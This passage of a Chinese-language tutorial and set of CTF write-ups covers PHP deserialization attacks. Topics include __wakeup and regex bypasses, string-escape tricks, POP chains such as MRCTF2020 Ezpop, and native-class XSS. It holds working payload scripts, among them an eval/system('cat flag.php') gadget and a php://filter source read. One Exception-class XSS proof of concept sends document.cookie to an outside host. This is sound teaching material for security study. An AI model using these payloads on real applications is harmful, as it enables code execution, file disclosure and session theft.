啦，是不是很方便？\n0x03 常见的序列化格式\n\n二进制格式\n字节数组\njson字符串\nxml字符串\n\n0x04 案例\n数组序列化\n&lt;?php  $a = array(&#x27;hello&#x27;,&#x27;hi&#x27;);  $a_ser = serialize($a);  echo $a_ser;?&gt;\n结果：\na:2:&#123;i:0;s:5:&quot;hello&quot;;i:1;s:2:&quot;hi&quot;;&#125;\n2：表示a有两个属性i：表示int型数据；0：表示下标0s：表示string字符串数组；5：长度为5\n解析：\na - array      b - booleand - double     i - integero - common     object r - references - string     C - custom objectO - class      N - nullR - pointer    reference U - unicode string\n对象序列化\n&lt;?php    class Student&#123;        public $name;        public $age;        function __construct()&#123;            $this-&gt;name = &#x27;abab&#x27;;            $this-&gt;age = 18;        &#125;        function pr()&#123;            return $this-&gt;name;            return $this-&gt;age;        &#125;        &#125;    $stu = new Student();    $stu_ser = serialize($stu);    echo $stu_ser?&gt;\n结果：\nO:7:&quot;Student&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;abab&quot;;s:3:&quot;age&quot;;i:18;&#125;\n注：序列化后的内容只有成员变量，没有成员函数\n还有一种成员变量就是protected类型\n&lt;?php    class test&#123;        public $aa;        private $bb;        protected $cc;        function __construct()&#123;            $this-&gt;aa = &#x27;aaa&#x27;;            $this-&gt;bb = &#x27;bbb&#x27;;            $this-&gt;cc = &#x27;ccc&#x27;;        &#125;    &#125;    $d = new test();    $d_ser = serialize($d);    echo $d_ser;?&gt;\n如果是private类型，会在变量名前加上**\\x00类名\\x00**，如果是protected类型，则会加上**\\x00*\\x00**，\n这些都是不可见字符\n输出则会导致不可见字符\\x00的丢失\n结果：\nO:4:&quot;test&quot;:3:&#123;s:2:&quot;aa&quot;;s:3:&quot;aaa&quot;;s:8:&quot;testbb&quot;;s:3:&quot;bbb&quot;;s:5:&quot;*cc&quot;;s:3:&quot;ccc&quot;;&#125;\n如果需要本地存储推荐“urlencode”\nurlencode($d_ser);\n序列化函数serialize()\n首先我创一个Ctf类 里面写了三个属性 后创建了一个ctfer对象 将Ctf类里的信息进行了改变。如果后面还要用到这个对象，就可以先将这个对象进行实例化。用的时候在反序列化出来就ok了。\n\nserialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，__sleep()方法会先被调用，然后才执行序列化操作。\n可以在__sleep()方法里决定哪些属性可以被序列化。如果没有__sleep()方法则默认序列化所有属性\n实例：\n\n即__sleep()方法使 flag age 属性序列化，而name并没有被序列化。所以可以在__sleep()方法里决定哪些属性被序列化。\n0x05 访问控制修饰符\n根据访问控制修饰符的不同 序列化后的 属性长度和属性值会有所不同，所以这里简单提一下\npublic(公有) protected(受保护)     // %00*%00属性名private(私有的)       // %00类名%00属性名\nprotected属性被序列化的时候属性值会变成**%00*%00属性名**\nprivate属性被序列化的时候属性值会变成**%00类名%00属性名**\n（%00为空白符，空字符也有长度，一个空字符长度为 1）\n实例：\n&lt;?php class Ctf&#123; \tpublic $name=&#x27;Sch0lar&#x27;; \tprotected $age=&#x27;19&#x27;; \tprivate $flag=&#x27;get flag&#x27;;    &#125; $ctfer=new Ctf(); //实例化一个对象echo serialize($ctfer); ?&gt; //输出结果 O:3:&quot;Ctf&quot;:3:&#123;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:6:&quot;*age&quot;;s:2:&quot;19&quot;;s:9:&quot;Ctfflag&quot;;s:8:&quot;get flag&quot;;&#125;\n可以看到\ns:6:&quot;*age&quot;   //*前后出现两个空白符，一个空白符长度为1，所以序列化后，该属性长度为6s:9:&quot;Ctfflag&quot;   //类名Ctf前后出现两个%00空白符，所以长度为9\n0x06 PHP-反序列化\n5.1 常见的PHP魔术方法\n__construct()，类的构造函数__destruct()，类的析构函数__call()，在对象中调用一个不可访问方法时调用__callStatic()，在静态上下文中调用一个不可访问的方法时调用__get()，读取不可访问属性的值时调用__set()，在给不可访问属性赋值时调用__isset()，当对不可访问属性调用isset()和empty()时，__isset()被调用__unset()，当对不可访问属性调用unset()时，__unset()会被调用__sleep()，执行serialize()时，先会调用这个函数__wakeup()，执行unserialize()时，先会调用这个函数__toString()，类被当成字符串时的回应方法__invoke()，当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用__set_state()，当调用var_export()导出类时，此静态方法会被调用__clone()，当对象复制完成时调用__debuginfo()，当转储对象以获取应显示的属性时，会被调用__autoload()，尝试加载未定义的类__serialize()，执行serialize()时，先会调用这个函数(这个和__sleep()的区别后面会详细介绍)__unserialize()，执行unserialize()时，先会调用这个函数(这个和__wakeup()的区别后面会详细介绍)\n反序列化函数unserialize()。反序列化就是将一个序列化了的对象或数组字符串，还原回去\n\n与序列化函数类似，unserialize()会检查类中是否存在一个__wakeup魔术方法\n如果存在则会先调用__wakeup()方法，再进行序列化\n可以在__wakeup()方法中对属性进行初始化、赋值或者改变。\n\n反序列化之前重新给flag属性赋值\n// 输出结果 object(Ctf)#2 (3) &#123;\t[&quot;flag&quot;]=&gt;    string(13) &quot;no flag&quot;    [&quot;name&quot;]=&gt;    string(7) &quot;Sch0lar&quot;    [&quot;age&quot;]=&gt;    string(2) &quot;18&quot;&#125;\n5.2 漏洞成因\n原理：未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL注入，目录遍历等不可控后果。\n在反序列化的过程中自动触发了某些魔术方法。\n漏洞触发条件： unserialize函数的参数、变量可控，php文件中存在可利用的类，类中有魔术方法\n而在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。这样，一旦我们能够控制unserialize()入口，那么就可能引发对象注入漏洞。\n5.3 序列化引擎\nphp对session的处理有三种引擎分别为php、php_serialize、php_binary.经过这三者处理后的session结构都不相同。\nphp_serialize\t-&gt;与serialize函数序列化后的结果一致php\t\t\t\t-&gt;key|serialize后的结果php_binary\t\t-&gt;键名的长度对应的ascii字符+键名+serialize()函数序列化的值默认使用php引擎\n使用php引擎的结果：\n\n使用php_serialize引擎的结果：\n\n使用php_binary引擎的结果如下\n\n其中存在不可见字符，将结果进行URL编码如下\n\n在session文件可写的情况下，可手动写入我们想要的内容,例如\n&lt;?phpini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html&#x27;);session_save_path(&#x27;/var/www/html&#x27;);session_start();highlight_file(__FILE__);include &quot;flag.php&quot;;$banner = &quot;--4ut15m--\\n&quot;;if($_SESSION[&#x27;name&#x27;]===&#x27;admin&#x27;)&#123;    echo $flag.&quot;&lt;br&gt;&quot;;&#125;else if(isset($_GET[&#x27;name&#x27;]) &amp;&amp; isset($_GET[&#x27;content&#x27;]))&#123;        if(preg_match(&#x27;/ph/i&#x27;,$_GET[&#x27;name&#x27;]))&#123;                var_dump($_GET[&#x27;name&#x27;]);            die(&#x27;over&#x27;);        &#125;else file_put_contents(&#x27;/var/www/html/&#x27;.$_GET[&#x27;name&#x27;],$banner . $_GET[&#x27;content&#x27;]);&#125;?&gt;\n该题目中可任意文件写入，故写入session文件构造name=admin.payload=|s:3:&quot;xxx&quot;;name|s:5:&quot;admin&quot;;\n\n简单说一下payload.\nbanner和payload拼接在一起后变为--4ut15m--\\n|s:3:&quot;xxx&quot;;name|s:5:&quot;admin&quot;;经php序列化引擎反序列化后就成为了\n$_SESSION=[&#x27;--4ut15m--\\n&#x27; =&gt; &#x27;xxx&#x27;, &#x27;name&#x27; =&gt; &#x27;admin&#x27;]\n0x07 反序列化绕过小Trick\n6.1 php7.1+反序列化对类属性不敏感\n我们前面说了如果变量前是protected，序列化结果会在变量名前加上\\x00*\\x00\n但在特定版本7.1以上则对于类属性不敏感，比如下面的例子即使没有\\x00*\\x00也依然会输出abc\n&lt;?phpclass test&#123;    protected $a;    public function __construct()&#123;        $this-&gt;a = &#x27;abc&#x27;;    &#125;    public function  __destruct()&#123;        echo $this-&gt;a;    &#125;&#125;unserialize(&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;);?&gt;\n6.2 绕过__wakeup\n版本：​ PHP5 &lt; 5.6.25​ PHP7 &lt; 7.0.10\n利用方式：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行\n例：\n &lt;?phpclass test&#123;    public $a;    public function __construct()&#123;        $this-&gt;a = &#x27;abc&#x27;;    &#125;    public function __wakeup()&#123;        $this-&gt;a=&#x27;666&#x27;;    &#125;    public function  __destruct()&#123;        echo $this-&gt;a;    &#125;&#125;\n如果执行unserialize(&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;);输出结果为666而把对象属性个数的值增大执行unserialize(&#x27;O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;);输出结果为abc\n6.3 绕过部分正则\n正则表达式：描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹\n配的子串替换或者从某个串中取出符合某个条件的子串等。\npreg_match(&#x27;/^O:\\d+/&#x27;)//匹配序列化字符串是否是对象字符串开头，+号可以实现绕过（+号代表空格）//另外反序列化在遇到+号时也会自动退出反序列化进程\n利用加号绕过（在url传参时注意+编码为%2B）\nserialize(array( a ) ) a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)\n&lt;?phpclass test&#123;    public $a;    public function __construct()&#123;        $this-&gt;a = &#x27;abc&#x27;;    &#125;    public function  __destruct()&#123;        echo $this-&gt;a.PHP_EOL;    &#125;&#125;function match($data)&#123;    if (preg_match(&#x27;/^O:\\d+/&#x27;,$data))&#123;        die(&#x27;you lose!&#x27;);    &#125;else&#123;        return $data;    &#125;&#125;$a = &#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;;// +号绕过$b = str_replace(&#x27;O:4&#x27;,&#x27;O:+4&#x27;, $a);unserialize(match($b));// serialize(array($a));unserialize(&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;);\n对应 ctfshow web258\n编写脚本：\n&lt;?phpclass ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public $class = &#x27;backDoor&#x27;;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class backDoor&#123;    public $code=&#x27;system(&quot;cat flag.php&quot;);&#x27;;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$a = new ctfShowUser();$a = serialize($a);$a= str_replace(&#x27;O:&#x27;, &#x27;O:+&#x27;,$a);//绕过preg_matchecho urlencode($a);?&gt;    //主要是调用backDoor执行eval命令函数获取flag\n6.4 利用引用\n&lt;?phpclass test&#123;    public $a;    public $b;    public function __construct()&#123;        $this-&gt;a = &#x27;abc&#x27;;        $this-&gt;b= &amp;$this-&gt;a;    &#125;    public function  __destruct()&#123;        if($this-&gt;a===$this-&gt;b)&#123;            echo 666;        &#125;    &#125;&#125;$a = serialize(new test());\n上面这个例子将$b设置为$a的引用，可以使$a永远与$b相等\n对应于ctfshow 265\n脚本代码：\n&lt;?phpclass ctfshowAdmin&#123;    public $token;    public $password;    public function __construct($t,$p)&#123;        $this-&gt;token=$t;        $this-&gt;password = &amp;$this-&gt;token;    &#125;    public function login()&#123;        return $this-&gt;token===$this-&gt;password;    &#125;&#125;$a = serialize(new ctfshowAdmin(&#x27;123&#x27;,&#x27;123&#x27;));echo urlencode($a);?&gt;\n6.5 16进制绕过字符的过滤\nO:4:&quot;test&quot;:2:&#123;s:4:&quot;%00*%00a&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;可以写成O:4:&quot;test&quot;:2:&#123;S:4:&quot;\\00*\\00\\61&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;表示字符类型的s大写时，会被当成16进制解析。61(16进制)-&gt;97(十进制)-&gt;a(ASCII)\n&lt;?phpclass test&#123;    public $username;    public function __construct()&#123;        $this-&gt;username = &#x27;admin&#x27;;    &#125;    public function  __destruct()&#123;        echo 666;    &#125;&#125;function check($data)&#123;    if(stristr($data, &#x27;username&#x27;)!==False)&#123;        echo(&quot;你绕不过！！&quot;.PHP_EOL);    &#125;    else&#123;        return $data;    &#125;&#125;// 未作处理前$a = &#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;;$a = check($a);unserialize($a);// 做处理后 \\75是u的16进制$a = &#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;;$a = check($a);unserialize($a);\n6.6 PHP反序列化字符逃逸\n1.过滤后字符变多（反序列化后的一个x替换成为两个）\n&lt;?phpfunction change($str)&#123;    return str_replace(&quot;x&quot;,&quot;xx&quot;,$str);&#125;$name = $_GET[&#x27;name&#x27;];$age = &quot;I am 11&quot;;$arr = array($name,$age);echo &quot;反序列化字符串：&quot;;var_dump(serialize($arr));echo &quot;&lt;br/&gt;&quot;;echo &quot;过滤后:&quot;;$old = change(serialize($arr));$new = unserialize($old);var_dump($new);echo &quot;&lt;br/&gt;此时，age=$new[1]&quot;;?&gt;\n正常输出如下\n\n添加一个x看看：\n\n这个就是将GET传入的name中的 x 改为了 xx\n正常传入不含x的name值就会正常显示\n例如：?name=mao，此时长度为3\n如果我们传入maox，正常情况下他的长度就是4，但是经过change函数的替换，变成了abcxx，导致溢\n出（长度大于4）\n进而影响下面的反序列化\n我们可以利用这一点来实现字符串逃逸\n构造：\n?name=abcxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;whoami&quot;;&#125;\n输出如下：\n\n解释：\n当我们构造name时，在abc后写18个x，而且后面 &quot;;i:1;s:4:“flag”;} 也是18的长度\n在进行change时，这里的18个x就变成了36个x，刚好符合序列化时的长度\n从而造成 &quot;;i:1;s:4:“flag”;} 溢出，前面的&quot;闭合前串，后面的;}闭合反序列化的全过程\n而先前存在的$age被舍弃（因为这里数组只有两个元素），不影响反序列化的过程\n总之，age变量被我们控制\n2.过滤后字符变少(把反序列化后的两个x替换成为一个)\n&lt;?phpfunction change($str)&#123;    return str_replace(&quot;xx&quot;,&quot;x&quot;,$str);&#125;$arr[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];$arr[&#x27;age&#x27;] = $_GET[&#x27;age&#x27;];echo &quot;反序列化字符串：&quot;;var_dump(serialize($arr));echo &quot;&lt;br/&gt;&quot;;echo &quot;过滤后:&quot;;$old = change(serialize($arr));var_dump($old);echo &quot;&lt;br/&gt;&quot;;$new = unserialize($old);var_dump($new);echo &quot;&lt;br/&gt;此时，age=&quot;;echo $new[&#x27;age&#x27;];\n\n构造：\n?name=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;age=11&quot;;s:3:&quot;age&quot;;s:6:&quot;whoami&quot;;&#125;\n这里的40个x经过滤后就变为了20个x，但是在前面的长度还是40，所以后面的20个字符被”吃掉“\n注意 &quot;;s:3:“age”;s:28: 这一部分本来就有，后面的 ;s:3:“age”;s:6:“whoami”;} 为我们所构造的\nage被我们控制\nctfshow web262\n脚本：\n&lt;?phpclass message&#123;    public $from;    public $msg;    public $to;    public $token=&#x27;user&#x27;;    public function __construct($f,$m,$t)&#123;        $this-&gt;from = $f;        $this-&gt;msg = $m;        $this-&gt;to = $t;    &#125;&#125;function filter($msg)&#123;    return str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, $msg);&#125;$msg = new message(&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;,&#x27;b&#x27;,&#x27;c&#x27;);$msg_1 = serialize($msg);echo $msg_1;$msg_2 =filter($msg_1);echo $msg_2;//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:310:&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;?&gt;\n0x08 对象注入\n对象注入\n当用户的请求在传给反序列化函数 unserialize() 之前没有被正确的过滤时就会产生漏洞。因为PHP允\n许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的 unserialize 函数，最终\n导致一个在该应用范围内的任意PHP对象注入。\n前提需要满足两个条件\n1、unserialize的参数可控。2、代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。\n&lt;?phpclass A&#123;public $test = &quot;12345&quot;;function __destruct()&#123;echo $this-&gt;test;&#125;&#125;$a = &#x27;O:1:&quot;A&quot;:1:&#123;s:4:&quot;test&quot;;s:5:&quot;23456&quot;;&#125;&#x27;;unserialize($a);?&gt;\n脚本结束时会调用**__destruct()函数**，同时会覆盖test变量输出 23456\n0x09 POP链简单介绍\n前面所讲解的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来\n简单案例MRCTF2020-Ezpop\n&lt;?php    class Modifier &#123;    protected $var;    public function append($value)&#123;        include($value);    &#125;    public function __invoke()&#123; //当尝试将对象调用为函数时触发        $this-&gt;append($this-&gt;var);    &#125;&#125;$a $bclass Show&#123;    public $source;    public $str;    public function __construct($file=&#x27;index.php&#x27;)&#123;        $this-&gt;source = $file;        echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123; //把类当作字符串使用时触发        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source))    &#123;            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;    \t&#125;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123; //当调用一个不存在的或者是无法访问的属性的时候被调用        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123;    @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123;    $a=new Show;    highlight_file(__FILE__);&#125;?&gt;\n共有3个类，反序列化会调用__wakeup，存在于Show类__wake中的$this-&gt;source可控，也就是Show中$source变量可控\n思路：将$source构造成一个对象Show，当$source为一个对象时。就会执行Show类中的__toString\n此时将$str指向Test类\n$this-&gt;str-&gt;source：取str类中的source值，使这个值自动调用__get\n此时将$p构造成new Modifier\nreturn $function() 表示将function当作函数返回\n当类变量直接当作函数调用的时候，就会调用魔术方法__invoke\n然后将$var构造成读取源码即可\n$var = &#x27;php://filter/read=convert.base64-encode/recource=flag.php&#x27;;\npayload：\n&lt;?phpini_set(&#x27;memory_limit&#x27;,&#x27;-1&#x27;);class Modifier &#123;    protected $var = &#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)&#123;        $this-&gt;source = $file;        $this-&gt;str = new Test();    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = new Modifier();&#125;&#125;$a = new Show(&#x27;aaa&#x27;);$a = new Show($a);echo urlencode(serialize($a));?&gt;\n来自：https://www.bilibili.com/video/av4142669\n0x10 PHP原生类反序列化利用\n我们可以使用以下方法遍历一下PHP的内置类：\n&lt;?php$classes = get_declared_classes();   //返回由已定义类的名字所组成的数组foreach ($classes as $class) &#123;    $methods = get_class_methods($class);  //返回由类的方法名组成的数组    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#x27;__destruct&#x27;,            &#x27;__toString&#x27;,            &#x27;__wakeup&#x27;,            &#x27;__call&#x27;,            &#x27;__callStatic&#x27;,            &#x27;__get&#x27;,            &#x27;__set&#x27;,            &#x27;__isset&#x27;,            &#x27;__unset&#x27;,            &#x27;__invoke&#x27;,            &#x27;__set_state&#x27;    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类        ))) &#123;            print $class . &#x27;::&#x27; . $method . &quot;\\n&quot;;        &#125;    &#125;&#125; \nException::__wakeupException::__toStringErrorException::__wakeupErrorException::__toStringError::__wakeupError::__toStringCompileError::__wakeupCompileError::__toStringParseError::__wakeupParseError::__toStringTypeError::__wakeupTypeError::__toStringArgumentCountError::__wakeupArgumentCountError::__toStringArithmeticError::__wakeupArithmeticError::__toStringDivisionByZeroError::__wakeupDivisionByZeroError::__toStringClosedGeneratorException::__wakeupClosedGeneratorException::__toStringDateTime::__wakeup......\n其中常遇到的几个 PHP 原生类有：\n\nError\nException\nSoapClient\nDirectoryIterator\nSimpleXMLElement\nSplFileObject\n\n10.1 Error/Exception 内置类进行 XSS\nError 内置类\n\n适用于php7版本\n在开启报错的情况下\n\nError类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 __toString() 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 echo &lt;Object&gt; 的写法，我们都知道当把对象当成字符串的时候它就会自动调用这个方法，而它会将Error以字符串的形式表达出来；那么假如有一个echo将它输出出来，而输出内容如果是我们可以控制的，那我们就可以用&lt;script&gt;标签来执行js代码了\nexample:\n&lt;?php$a = unserialize($_GET[&#x27;whoami&#x27;]);echo $a;?&gt; \n（这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化）\nPOC:\n&lt;?php$a = new Error(&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);  ?&gt;// 输出：O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A26%3A%22%2Fvar%2Fwww%2Fhtml%2Ftmp%2Ftest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D\n\n\n&lt;script&gt;标签直接被嵌入了进去，那里面的内容自然就会被当成js代码执行咯\nException类和Error类类似，用法原理都差不多，这里就不赘述了，只不过Exception类无论是在php5还是php7的环境下都能使用\nException 内置类\n\n适用于php5、7版本\n开启报错的情况下\n\nexample：\n&lt;?php$a = unserialize($_GET[&#x27;whoami&#x27;]);echo $a;?&gt; \n&lt;?php$a = new Exception(&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);  ?&gt;// 输出：O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A26%3A%22%2Fvar%2Fwww%2Fhtml%2Ftmp%2Ftest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D\n\n[BJDCTF 2nd]xss之光\n不知道为何BUU里面这道题没了，只好看着别人的说一次。\n进入题目，首先通过git泄露拿到源码：\n&lt;?php$a = $_GET[&#x27;yds_is_so_beautiful&#x27;];echo unserialize($a);\n仅看到一个反序列化函数并没有给出需要反序列化的类，这就遇到了一个反序列化但没有POP链的情况，所以只能找PHP内置类来进行反序列化。又发现有个echo，没得跑了，就是我们刚才演示的利用Error或Exception内置类进行XSS，但是查看一下题目的环境发现是PHP 5，所以我们要使用Exception类。\n由于此题是xss，所以只要xss执行window.open()就能把flag带出来，所以POC如下：\n&lt;?php$poc = new Exception(&quot;&lt;script&gt;window.open(&#x27;http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?&#x27;+document.cookie);&lt;/script&gt;&quot;);echo urlencode(serialize($poc));?&gt; // 输出O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A109%3A%22%3Cscript%3Ewindow.open%28%27http%3A%2F%2Fde28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn%2F%3F%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D\n执行后，得到flag就在 cookie 中。\n10.2 Error/Exception 内置类绕过哈希比较\nError 类\nError 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。\n类摘要：\nError implements Throwable &#123;    /* 属性 */    protected string $message ;    protected int $code ;    protected string $file ;    protected int $line ;    /* 方法 */    public __construct ( string $message = &quot;&quot; , int $code = 0 , Throwable $previous = null )    final public getMessage ( ) : string    final public getPrevious ( ) : Throwable    final public getCode ( ) : mixed    final public getFile ( ) : string    final public getLine ( ) : int    final public getTrace ( ) : array    final public getTraceAsString ( ) : string    public __toString ( ) : string    final private __clone ( ) : void&#125;\n类属性：\n- message：错误消息内容- code：错误代码- file：抛出错误的文件名- line：抛出错误在该文件中的行数\n类方法：\n- `Error::__construct` — 初始化 error 对象- `Error::getMessage` — 获取错误信息- `Error::getPrevious` — 返回先前的 Throwable- `Error::getCode` — 获取错误代码- `Error::getFile` — 获取错误发生时的文件- `Error::getLine` — 获取错误发生时的行号- `Error::getTrace` — 获取调用栈（stack trace）- `Error::getTraceAsString` — 获取字符串形式的调用栈（stack trace）- `Error::__toString` — error 的字符串表达- `Error::__clone` — 克隆 error\nException 类\nException 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。\n类摘要：\nException &#123;    /* 属性 */    protected string $message ;    protected int $code ;    protected string $file ;    protected int $line ;    /* 方法 */    public __construct ( string $message = &quot;&quot; , int $code = 0 , Throwable $previous = null )    final public getMessage ( ) : string    final public getPrevious ( ) : Throwable    final public getCode ( ) : mixed    final public getFile ( ) : string    final public getLine ( ) : int    final public getTrace ( ) : array    final public getTraceAsString ( ) : string    public __toString ( ) : string    final private __clone ( ) : void&#125;\n类属性：\n- message：异常消息内容- code：异常代码- file：抛出异常的文件名- line：抛出异常在该文件中的行号\n类方法：\n- `Exception::__construct` — 异常构造函数- `Exception::getMessage` — 获取异常消息内容- `Exception::getPrevious` — 返回异常链中的前一个异常- `Exception::getCode` — 获取异常代码- `Exception::getFile` — 创建异常时的程序文件名称- `Exception::getLine` — 获取创建的异常所在文件中的行号- `Exception::getTrace` — 获取异常追踪信息- `Exception::getTraceAsString` — 获取字符串类型的异常追踪信息- `Exception::__toString` — 将异常对象转换为字符串- `Exception::__clone` — 异常克隆\n我们可以看到，在Error和Exception这两个PHP原生类中内都有 __toString 方法，这个方法用于将异常或错误对象转换为字符串。\n我们以Error为例，我们看看当触发他的 __toString 方法时会发生什么：\n&lt;?php$a = new Error(&quot;payload&quot;,1);echo $a;\n输出：\nError: payload in /var/www/html/tmp/test.php:2Stack trace:#0 &#123;main&#125;\n发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 Error(&quot;payload&quot;,1) 中的错误代码“1”则没有输出出来。\n在来看看下一个例子：\n&lt;?php$a = new Error(&quot;payload&quot;,1);$b = new Error(&quot;payload&quot;,2);echo $a;echo &quot;\\r\\n\\r\\n&quot;;echo $b;\n输出：\nError: payload in /var/www/html/tmp/test.php:2Stack trace:#0 &#123;main&#125; Error: payload in /var/www/html/tmp/test.php:2Stack trace:#0 